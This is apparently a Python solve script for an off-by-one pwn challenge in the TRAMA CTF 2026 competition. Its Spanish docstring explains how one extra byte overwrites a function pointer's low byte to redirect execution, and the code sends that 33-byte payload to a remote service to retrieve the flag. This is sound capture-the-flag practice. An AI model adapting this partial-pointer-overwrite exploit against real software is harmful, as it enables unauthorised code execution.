#!/usr/bin/env python3
"""Un Byte Más — TRAMA CTF 2026 (pwn / off-by-one).

El binario reserva 32 bytes para la trama y guarda en [rsp+0x20] el puntero
a la "compuerta" (0x478100, un simple `ret`). Luego hace:

    read(0, rsp, 0x21)

es decir, lee 33 bytes: 32 de la trama + 1 que cae sobre el byte bajo del
puntero. Cambiando 0x00 -> 0x50 el puntero pasa a 0x478150, recorre el
NOP-sled de .callbacks hasta 0x478170 (`jmp 0x401991`), que abre y muestra
/tmp/flag.

Uso remoto:
    python3 solve.py
    python3 solve.py --host <host> --port 3206

El payload es 32 rellenos + b"\\x50" (cualquier valor 0x01..0x70 sirve;
0x00 deja la compuerta original y no imprime nada).
"""

import argparse
import socket
import sys
import time

DEFAULT_HOST = "<host>"
DEFAULT_PORT = 3206
LOW_BYTE = 0x50  # 0x478100 -> 0x478150 (NOP-sled)


def recv_until(sock, marker, timeout=10.0):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def solve(host, port, low_byte, timeout):
    payload = b"A" * 32 + bytes([low_byte])
    print(f"[*] {host}:{port}  payload={payload[:8]!r}...{payload[-1]:#04x}", flush=True)

    sock = socket.create_connection((host, port), timeout=timeout)
    banner = recv_until(sock, b"Trama (33 bytes):", timeout)
    sys.stdout.write(banner.decode(errors="replace"))
    sys.stdout.flush()

    sock.sendall(payload)
    time.sleep(0.3)
    out = b""
    sock.settimeout(3.0)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    sock.close()

    text = out.decode(errors="replace")
    print("\n[+] Respuesta:")
    print(text)
    if "TRAMACTF{" not in text:
        print("[!] No se recibió una flag; revisa la conexión o el byte elegido.")
        return 1
    return 0


def main():
    ap = argparse.ArgumentParser(description="Exploit Un Byte Más (off-by-one)")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--byte", type=lambda x: int(x, 0), default=LOW_BYTE,
                    help="byte bajo del puntero de la compuerta (default 0x50)")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()
    if not 0x01 <= args.byte <= 0x70:
        ap.error("--byte debe estar entre 0x01 y 0x70")
    return solve(args.host, args.port, args.byte, args.timeout)


if __name__ == "__main__":
    sys.exit(main())
